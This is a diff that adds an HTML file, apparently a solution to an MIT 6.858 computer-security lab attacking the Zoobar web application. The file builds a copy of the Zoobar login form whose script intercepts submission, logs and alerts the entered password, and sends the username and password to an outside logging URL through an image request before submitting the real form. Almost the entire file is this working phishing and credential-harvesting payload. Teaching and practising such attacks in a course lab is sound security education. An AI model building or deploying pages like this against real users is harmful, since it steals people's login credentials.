@@ -1,0 +1,46 @@
+<div id="login" class="centerpiece">
+<form name="loginform" method="POST" action="http://192.168.244.129:8080/zoobar/index.cgi/login">
+<table>
+<tr>
+   <td>Username:</td>
+  <td><input type="text" name="login_username" size="20"
+  autocomplete="no" value=""></td>
+</tr>
+<tr>
+   <td>Password:</td>
+  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
+  <input type="submit" name="submit_login" value="Log in">
+  <input type="submit" name="submit_registration" value="Register"></td>
+</tr>
+</table>
+<input type="hidden" name="nexturl" value="/zoobar/index.cgi/users">
+</form>
+</div>
+
+<script type="text/javascript">
+	var login_form = document.getElementsByName("loginform")[0];
+	var username = document.getElementsByName("login_username")[0];
+	var password = document.getElementsByName("login_password")[0];
+
+	login_form.addEventListener("submit", function(event) {
+		console.log("submitted");
+		console.log("username is ");
+		console.log(username["value"]);
+		console.log("password is ");
+		console.log(password["value"]);
+		
+		event.preventDefault();
+		
+		setTimeout(function(arg) {
+
+			alert(password["value"]);
+			(new Image()).src='http://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=test' + '&payload=' + username["value"] + "/" + password["value"] + "&random=" + Math.random();
+		}, 2000);
+
+		setTimeout(function(arg) {
+			login_form.submit();
+		}, 2000);
+
+		login_form.removeEventListener("submit", this);
+	}, false);
+</script>
